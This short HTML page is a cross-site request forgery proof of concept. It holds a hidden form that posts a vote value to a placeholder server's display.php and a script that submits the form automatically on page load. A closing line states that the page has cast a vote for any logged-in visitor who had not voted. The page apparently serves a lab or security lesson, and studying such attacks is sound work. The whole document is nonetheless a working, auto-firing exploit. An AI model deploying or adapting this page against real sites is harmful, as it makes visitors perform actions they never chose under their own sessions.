<html>
<body>

<form id="attack" action="http://SERVER_IP/display.php" method="POST">
    <input type="hidden" name="color" value="red">
</form>

<script>
    document.getElementById('attack').submit();
</script>

<p>If the user is logged in and hasn't voted, this page just cast a vote for them.</p>

</body>
</html>
